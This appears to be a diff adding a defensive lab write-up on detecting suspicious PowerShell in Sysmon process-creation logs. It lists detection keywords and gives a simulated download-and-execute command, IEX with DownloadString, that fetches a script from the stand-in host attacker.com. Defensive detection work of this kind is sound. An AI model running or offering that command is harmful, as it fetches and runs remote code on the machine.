@@ -1,0 +1,41 @@
+🔍 Detection Logic for Suspicious PowerShell Activity
+
+📁 Log Source:
+Microsoft Sysmon (System Monitor)
+→ Event ID 1 (Process Creation)
+
+🛠️ Detection Goal:
+Identify PowerShell commands that show signs of:
+- Obfuscation
+- Download and execution of remote scripts
+- Use of encoded or hidden payloads
+
+🔎 What We Looked For:
+- Command line includes:
+    - powershell -EncodedCommand
+    - IEX
+    - Invoke-Expression
+    - DownloadString
+    - FromBase64String
+
+📊 Simulated Commands Used:
+1. powershell -EncodedCommand ZQBj...
+2. powershell -Command "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/script')"
+
+🧠 Why It Matters:
+These command patterns are commonly used in:
+- Initial access via phishing
+- Malware droppers
+- Fileless attacks
+- Reverse shell scripts
+
+📌 Recommendation:
+Create a detection rule (e.g., Sigma or Windows Event Forwarding filter) that triggers an alert if:
+- Image is powershell.exe
+- CommandLine contains suspicious keywords
+
+✅ Outcome:
+Confirmed Sysmon successfully captured these commands under Event ID 1. Analysis completed manually using Event Viewer.
+
+🧑‍💻 Analyst: Naveen Kumar
+📅 Date: July 2025
